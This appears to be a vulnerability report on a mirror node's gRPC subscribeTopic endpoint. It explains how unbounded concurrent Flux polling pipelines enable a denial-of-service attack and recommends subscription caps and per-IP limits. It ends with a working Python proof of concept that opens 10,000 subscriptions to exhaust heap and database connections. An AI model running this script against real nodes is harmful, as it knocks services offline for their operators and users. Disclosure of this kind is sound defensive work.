### Title
Unbounded Concurrent Subscription Accumulation Leading to Heap Exhaustion (Slow-Drain DoS)

### Summary
`PollingTopicMessageRetriever.retrieve()` creates a Flux pipeline per subscription that lives for up to 60 seconds (`retrieverProperties.getTimeout()`), polling the database every 2 seconds. There is no global cap on concurrent subscriptions — only a per-connection limit of 5 (`maxConcurrentCallsPerConnection`). An unprivileged attacker opening many TCP connections can accumulate thousands of concurrent Flux pipelines, exhausting heap and database connection pools across nodes.

### Finding Description

**Code path:**

`TopicMessageServiceImpl.subscribeTopic()` (line 63) calls `topicMessageRetriever.retrieve(filter, true)` (throttled=true). [1](#0-0) 

Inside `PollingTopicMessageRetriever.retrieve()`, when `throttled=true`, `numRepeats` is set to `Long.MAX_VALUE`: [2](#0-1) 

The pipeline polls the DB every `pollingFrequency` (default 2 s) and is only terminated by the 60-second timeout: [3](#0-2) 

The only per-subscription resource bound is the 60-second timeout: [4](#0-3) 

**Why the existing checks fail:**

The only concurrency guard is `maxConcurrentCallsPerConnection = 5`: [5](#0-4) 

This limits calls *per TCP connection*, not globally. An attacker opens N connections → N×5 concurrent subscriptions. `subscriberCount` in `TopicMessageServiceImpl` is a Micrometer gauge only — it is never checked against a maximum: [6](#0-5) 

There is no per-IP limit, no global subscription cap, and no authentication requirement.

**Root cause:** The `throttled=true` path sets `numRepeats = Long.MAX_VALUE` and relies solely on the 60-second timeout as the upper bound. With no global subscription limit, an attacker can maintain a steady-state pool of thousands of concurrent pipelines by continuously opening new subscriptions before old ones expire.

**Note on `isComplete()` for empty topics:** For a topic with no messages, `isComplete()` returns true after the first poll (pageSize 0 < maxPageSize 1000), so the historical retriever terminates early. However, `subscribeTopic()` then immediately starts the live listener phase (`incomingMessages` / `topicListener.listen()`), which is unbounded with no `endTime`. The attacker can also target a high-volume topic to keep the historical retriever alive for the full 60 seconds. [7](#0-6) 

### Impact Explanation

Each concurrent subscription holds:
- A `PollingContext` + `TopicContext` object graph on the heap
- A scheduled task slot on the shared `boundedElastic` scheduler (fired every 2 s)
- An active JDBC/R2DBC connection or query for the duration of each poll
- Reactor operator chain objects (repeatWhen, retryWhen, timeout, tap)

With thousands of concurrent subscriptions, the cumulative heap pressure causes OOM on the node JVM. Simultaneously, 1000 subscriptions × 1 DB query/2 s = 500 DB queries/second of pure attacker-generated load, which can saturate the database connection pool and degrade or crash all nodes sharing that pool. This meets the ≥30% node shutdown threshold without any brute-force or privileged access.

### Likelihood Explanation

- No authentication is required to call the gRPC `subscribeTopic` endpoint.
- Opening thousands of TCP connections is trivial from a single machine or small botnet.
- The attack is repeatable and self-sustaining: as 60-second subscriptions expire, the attacker opens replacements to maintain the desired concurrency level.
- The attacker does not need to send or receive any messages — simply opening the subscription and stalling is sufficient.

### Recommendation

1. **Global subscription cap**: Enforce a configurable maximum total concurrent subscriptions (e.g., `maxSubscribers`) checked atomically against `subscriberCount` before allowing a new subscription; return `RESOURCE_EXHAUSTED` gRPC status when exceeded.
2. **Per-IP/per-client connection limit**: Configure Netty's `maxConnectionsPerIp` or add a gRPC `ServerInterceptor` that tracks and limits subscriptions per remote address.
3. **Reduce default timeout**: Lower `retrieverProperties.getTimeout()` from 60 s to a shorter value (e.g., 10 s) for the throttled historical path, or make it configurable with a hard cap.
4. **Require `endTime` or `limit`**: Reject subscriptions that specify neither an `endTime` nor a message `limit`, preventing indefinitely-open live-listener pipelines.
5. **Backpressure enforcement**: Drop or error subscriptions where the client is not consuming (zero demand for >N seconds).

### Proof of Concept

```python
import grpc
import threading
import time
# proto: hiero/mirror/api/proto/consensus_service.proto

def open_subscription(stub, topic_id):
    request = ConsensusTopicQuery(
        topicID=ConsensusTopicID(topicNum=topic_id),
        # No limit, no endTime — subscription stays open
    )
    try:
        for _ in stub.subscribeTopic(request):
            pass  # never consume — or just let it block
    except Exception:
        pass

stubs = []
for _ in range(2000):  # 2000 connections × 5 calls each = 10,000 subscriptions
    channel = grpc.insecure_channel("mirror-node-grpc:5600")
    stub = ConsensusServiceStub(channel)
    stubs.append(stub)

threads = []
for stub in stubs:
    for _ in range(5):
        t = threading.Thread(target=open_subscription, args=(stub, 1234))
        t.daemon = True
        t.start()
        threads.append(t)

time.sleep(120)  # hold for 2× the timeout window to maintain steady state
# Expected: mirror node JVM OOM / GC thrashing / DB connection pool exhaustion
```
